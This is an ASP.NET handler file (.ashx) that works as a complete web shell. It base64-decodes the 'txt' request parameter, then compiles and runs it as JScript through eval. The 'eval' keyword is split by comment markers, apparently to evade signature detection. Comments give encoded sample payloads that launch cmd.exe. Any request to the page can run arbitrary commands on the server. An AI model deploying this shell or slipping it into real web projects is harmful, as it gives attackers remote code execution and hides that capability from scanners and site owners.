<%@ WebHandler Language="C#" class="JscriptDynamicCodeCompiler"%>
using System;
using System.Web;
using System.CodeDom.Compiler;
using System.Reflection;


/// <summary>
/// code by Ivan1ee, just for fun!
/// </summary>
public static class DynamicCodeCompiler
{
    private static Type _runType; private static object _runInstance;
    private static readonly string _jscriptClassText =
    @"import System;
            class JScriptRun
            {
                public static function RunExp(expression : String) : String
                {
                    return e/*@Ivan1ee@*/v/*@Ivan1ee@*/a/*@Ivan1ee@*/l(expression);
                }
            }";
    private static void Initialize()
    {
        CodeDomProvider compiler = CodeDomProvider.CreateProvider("Jscript");
        CompilerParameters parameters = new CompilerParameters();
        parameters.GenerateInMemory = true;
        parameters.ReferencedAssemblies.Add("System.dll");
        CompilerResults results = compiler.CompileAssemblyFromSource(parameters, _jscriptClassText.Replace("/*@Ivan1ee@*/", ""));
        Assembly assembly = results.CompiledAssembly;
        _runType = assembly.GetType("JScriptRun");
        _runInstance = Activator.CreateInstance(_runType);
    }
    public static string Run(string expression)
    {
        if (_runInstance == null)
            Initialize();
        object result = _runType.InvokeMember("RunExp", BindingFlags.InvokeMethod, null, _runInstance, new object[] { expression });
        return (result == null) ? null : result.ToString();
    }

}
/// <summary>
/// Handler1 的摘要说明
/// </summary>
public class JscriptDynamicCodeCompiler : IHttpHandler
{

    public void ProcessRequest(HttpContext context)
    {
        context.Response.ContentType = "text/plain";
        if (!string.IsNullOrEmpty(context.Request["txt"]))
        {
            //start calc: System.Diagnostics.Process.Start("cmd.exe","/c calc"); => U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MuU3RhcnQoImNtZC5leGUiLCIvYyBjYWxjIik7
            //show ipconfig: System.Diagnostics.Process.Start("cmd.exe","/c ipconfig"); => U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MuU3RhcnQoImNtZC5leGUiLCIvYyBpcGNvbmZpZyIpOw==
            DynamicCodeCompiler.Run(System.Text.Encoding.GetEncoding("UTF-8").GetString(Convert.FromBase64String(context.Request["txt"])));
            context.Response.Write("Execute Status: Success!");
        }
        else
        {
            context.Response.Write("Just For Fun, Please Input txt!");
        }
    }

    public bool IsReusable
    {
        get
        {
            return false;
        }
    }
}

